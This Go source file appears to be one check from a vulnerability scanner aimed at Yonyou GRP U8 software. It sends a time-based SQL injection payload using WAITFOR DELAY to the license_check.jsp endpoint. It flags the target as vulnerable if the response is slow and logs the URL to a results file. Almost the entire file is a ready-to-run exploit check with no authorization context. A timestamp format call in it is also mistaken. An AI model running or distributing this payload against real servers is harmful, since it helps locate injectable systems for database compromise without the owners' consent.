package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func License_checkSQLiScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	const license_check = "用友 GRP U8 license_check.jsp SQL注入漏洞"
	urls := address + "/u8qx/license_check.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27--"

	// 记录请求开始时间
	startTime := time.Now()

	// 发送 GET 请求
	response, err := client.Get(urls)
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, license_check)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, license_check)
		}
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, license_check, err)
		fmt.Println(output)
		return
	}

	// 计算请求耗时
	elapsedTime := time.Since(startTime)

	// 检查漏洞是否存在
	if response.StatusCode == http.StatusOK && strings.Contains(string(body), "1") && elapsedTime.Seconds() > 4 {
		result := license_check + "：" + urls
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Green, currentTime, Reset, Green, Reset, license_check, urls)
		fmt.Println(output)

		// 保存结果到文件
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		if err := Utils.SaveResultToFile(result, filename); err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 保存结果到文件出错: %v", Cyan, currentTime, Reset, Yellow, Reset, license_check, err)
			fmt.Println(output)
		}
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, license_check, response.StatusCode)
		fmt.Println(output)
	}
}
